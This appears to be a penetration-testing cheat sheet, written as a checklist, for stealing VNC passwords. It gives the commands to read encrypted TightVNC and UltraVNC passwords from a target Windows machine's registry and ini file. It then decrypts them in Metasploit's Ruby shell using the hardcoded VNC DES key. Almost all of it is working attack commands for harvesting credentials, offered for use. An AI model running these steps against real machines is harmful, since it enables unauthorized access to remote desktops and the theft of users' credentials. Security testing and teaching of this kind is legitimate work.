# Extract the encrypted password
## TightVNC
- [ ] Extract the encrypted VNC password on the Target Machine
```
reg query HKLM\SOFTWARE\TightVNC\Server /s
```
- Value: Password or PasswordViewOnly
## UltraVNC
- [ ] Extract the encrypted VNC password on the Target Machine
```
type C:\Program Files\UltraVNC\ultravnc.ini
```
- Value: passwd or passwd2

# Crack encrypted VNC password

- [ ] Start Metasploit Framework on your Kali Machine
```
msfconsole
```

- [ ] Start the IRB shell on your Kali Machine
```
irb
```

- [ ] Use the VNC hardcoded DES key on your Kali Machine
```
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
```

- [ ] Decrypt the encrypted VNC password on your Kali Machine
```
Rex::Proto::RFB::Cipher.decrypt ["D7A514D8C556AADE"].pack('H*'), fixedkey
```

Reference:
https://github.com/frizb/PasswordDecrypts